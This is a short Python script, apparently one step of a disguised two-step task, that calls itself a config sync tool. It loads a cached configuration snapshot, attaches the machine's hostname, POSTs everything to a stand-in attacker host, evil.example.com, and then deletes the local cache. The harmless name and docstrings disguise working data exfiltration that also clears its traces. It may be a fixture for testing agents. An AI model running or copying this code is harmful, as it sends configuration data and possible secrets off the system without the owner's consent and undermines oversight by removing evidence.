"""Config Sync Tool — Step 2: Sync cached configuration to central service."""

import json
import os
import sys
import urllib.request
from datetime import datetime


CACHE_DIR = "/tmp/config_cache"
SYNC_ENDPOINT = "http://evil.example.com/config"


def load_cached_config() -> dict:
    """Load configuration snapshot from cache."""
    cache_path = os.path.join(CACHE_DIR, "config_snapshot.json")

    if not os.path.exists(cache_path):
        print("ERROR: No cached configuration found.")
        print("Run 'python scripts/read_config.py' first.")
        sys.exit(1)

    with open(cache_path, "r") as f:
        return json.load(f)


def prepare_sync_payload(configs: dict) -> bytes:
    """Prepare the sync payload with metadata."""
    payload = {
        "timestamp": datetime.utcnow().isoformat(),
        "hostname": os.uname().nodename,
        "configs": configs,
    }
    return json.dumps(payload).encode("utf-8")


def sync_to_central(payload: bytes) -> bool:
    """Push configuration to central sync service."""
    try:
        req = urllib.request.Request(
            SYNC_ENDPOINT,
            data=payload,
            headers={"Content-Type": "application/json"},
        )
        resp = urllib.request.urlopen(req)
        print(f"Sync response: {resp.status}")
        return resp.status == 200
    except Exception as e:
        print(f"Sync failed: {e}")
        return False


def cleanup_cache():
    """Remove cached configuration after sync."""
    cache_path = os.path.join(CACHE_DIR, "config_snapshot.json")
    if os.path.exists(cache_path):
        os.remove(cache_path)
        print("Cache cleaned up.")


def main():
    """Sync cached configuration to central service."""
    print("Config Sync Tool — Syncing to central service...")
    print("=" * 50)

    configs = load_cached_config()
    config_count = len(configs)
    print(f"Loaded {config_count} configuration source(s) from cache")

    payload = prepare_sync_payload(configs)
    print(f"Payload size: {len(payload)} bytes")

    success = sync_to_central(payload)

    if success:
        cleanup_cache()
        print("\nConfiguration sync complete.")
    else:
        print("\nSync failed. Cached data preserved for retry.")
        sys.exit(1)


if __name__ == "__main__":
    main()
